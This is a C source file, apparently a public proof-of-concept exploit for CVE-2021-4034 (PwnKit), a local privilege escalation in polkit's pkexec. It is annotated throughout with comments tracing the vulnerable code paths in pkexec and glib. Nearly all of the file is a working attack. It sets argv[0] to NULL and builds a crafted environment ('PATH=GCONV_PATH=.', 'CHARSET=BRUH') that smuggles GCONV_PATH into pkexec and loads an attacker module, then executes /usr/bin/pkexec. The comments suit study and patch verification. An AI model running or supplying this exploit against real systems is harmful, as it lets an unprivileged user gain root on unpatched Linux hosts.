/** 
 * pwnkit: Local Privilege Escalation in polkit's pkexec (CVE-2021-4034)
 * Research advisory: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
 * poc by @PwnFunction <hello@pwnfunction.com>
 * */

#include <unistd.h>

int main() {
    /** 
     * Default n=1 via argv[0]=NULL, ergo argv[1] == envp[0] for OOB read and write primitives.
     *
     * Source: https://gitlab.freedesktop.org/polkit/polkit/-/blob/0.105/src/programs/pkexec.c#L481
     *
     * 481   for (n = 1; n < (guint) argc; n++) { ... }
     * ...
     * 537   path = g_strdup (argv[n]);
     * */
    char *argv[] = { NULL };

    char *envp[] = {
        /**
         * `pwn` is argv[1] when OOB read, 
         * and will be overwritten by "unsecure" env variable "GCONV_PATH=./pwn" 
         *
         * Source: https://gitlab.freedesktop.org/polkit/polkit/-/blob/0.105/src/programs/pkexec.c#L543
         * 
         * 543   if (path[0] != '/')
         * 544     {
         * ...
         * 546       s = g_find_program_in_path (path);
         * ...
         * 553       argv[n] = path = s;
         * 554     }
         * */ 
        "pwn",

        /** 
         * Trigger `g_printerr` via "suspicious content" ("/", "%", "..") in `validate_environment_variable`
         * Choose `TERM` for no reason, any "safe" env variable works
         *
         * Source: https://gitlab.freedesktop.org/polkit/polkit/-/blob/0.105/src/programs/pkexec.c#L333
         * 
         * 333 static gboolean
         * 334 validate_environment_variable (const gchar *key,
         * 335                               const gchar *value)
         * 336 {
         * ...
         * 352   if (g_strcmp0 (key, "SHELL") == 0) { ... }
         * ...
         * 364   else if ((g_strcmp0 (key, "XAUTHORITY") != 0 && strstr (value, "/") != NULL) ||
         * 365            strstr (value, "%") != NULL ||
         * 366            strstr (value, "..") != NULL)
         * 367   {
         * ...
         * 371     g_printerr ("\n"
         * 372                 "This incident has been reported.\n");
         * ...
         * 374   }
         * ...
         * 380 }
         * */
        "TERM=..",

        /** 
         * Should have a directory named `GCONV_PATH=.`.
         * Inside a file should exist with the name `pwn`
         * `g_find_program_in_path` resolve `path` to "GCONV_PATH=./pwn"
         * Overwrite argv[1]="GCONV_PATH=./pwn", which is also envp[0]
         *
         * Source: https://gitlab.freedesktop.org/polkit/polkit/-/blob/0.105/src/programs/pkexec.c#L546
         *
         * 546       s = g_find_program_in_path (path);
         * ...
         * 553       argv[n] = path = s;
         * */
        "PATH=GCONV_PATH=.",
        /**
         * `UNSECURE_ENVVARS`: https://code.woboq.org/userspace/glibc/sysdeps/generic/unsecvars.h.html
         * `__unsetenv`: https://code.woboq.org/userspace/glibc/elf/dl-support.c.html#348
         * */

        /** 
         * Under `g_printerr`, control the condition `g_get_console_charset()`.
         *
         * Source: https://github.com/GNOME/glib/blob/c2a56a0252acc8bd9dbff953c6c1969815863815/glib/gmessages.c#L3400
         * 
         * 3400       if (g_get_console_charset (&charset))
         *
         * ---
         *
         * Inside `g_get_console_charset`, for unix systems calls `g_get_charset`.
         *
         * Source: https://github.com/GNOME/glib/blob/c2a56a0252acc8bd9dbff953c6c1969815863815/glib/gcharset.c#L432
         *
         * 432   return g_get_charset (charset);
         *
         * ---
         *
         * Under `g_get_charset`, we need to set `cache->is_utf8` to false.
         *
         * Source: https://github.com/GNOME/glib/blob/c2a56a0252acc8bd9dbff953c6c1969815863815/glib/gcharset.c#L220
         *
         * 220       cache->is_utf8 = g_utf8_get_charset_internal (raw, &new_charset);
         *
         * ---
         *
         * Inside `g_utf8_get_charset_internal`, returns `FALSE` if env variable `CHARSET` is not "UTF-8"
         *
         * Source: https://github.com/GNOME/glib/blob/c2a56a0252acc8bd9dbff953c6c1969815863815/glib/gcharset.c#L124
         *
         * 124       if (charset && strstr (charset, "UTF-8"))
         * 125         return TRUE;
         * 
         * */
        "CHARSET=BRUH",
        NULL
    };

    /**
     *
     * Back in `g_printerr`, when `g_get_console_charset` returns false, we branch to else
     *
     * Source: https://github.com/GNOME/glib/blob/c2a56a0252acc8bd9dbff953c6c1969815863815/glib/gmessages.c#L3404
     *
     * 3400       if (g_get_console_charset (&charset))
     * 3401         fputs (string, stderr); 
     * 3402       else
     * 3403        {
     * 3404         gchar *lstring = strdup_convert (string, charset);
     *  ...
     * 3408        }
     * 
     * ---
     * 
     * Inside `strdup_convert`, if the string is not a valid utf8 string, it calls the g_convert_with_fallback
     * 
     * Source: https://github.com/GNOME/glib/blob/c2a56a0252acc8bd9dbff953c6c1969815863815/glib/gmessages.c#L1064
     * 
     * 1043   if (!g_utf8_validate (string, -1, NULL)) { ... }
     * 1060   else
     * 1061     {
     *  ...
     * 1064        gchar *result = g_convert_with_fallback (string, -1, charset, "UTF-8", "?", NULL, NULL, &err);
     *  ...
     * 1081     }
     * 
     * ---
     * 
     * Under `g_convert_with_fallback`, calls the open_converter
     * 
     * Source: https://github.com/GNOME/glib/blob/c2a56a0252acc8bd9dbff953c6c1969815863815/glib/gconvert.c#L697
     * 
     * 697    cd = open_converter (to_codeset, "UTF-8", error);
     * 
     * ---
     * 
     * `open_converter` finally calls the `g_icon_open` which is - "Same as the standard UNIX routine iconv_open(), 
     * but may be implemented via libiconv on UNIX flavors that lack a native implementation."
     * 
     * Source: https://github.com/GNOME/glib/blob/c2a56a0252acc8bd9dbff953c6c1969815863815/glib/gconvert.c#L313
     * 
     * 313   cd = g_iconv_open (to_codeset, from_codeset);
     *
     * */
    
    /* Fire it! */    
    execve("/usr/bin/pkexec", argv, envp);

    return 0;
}
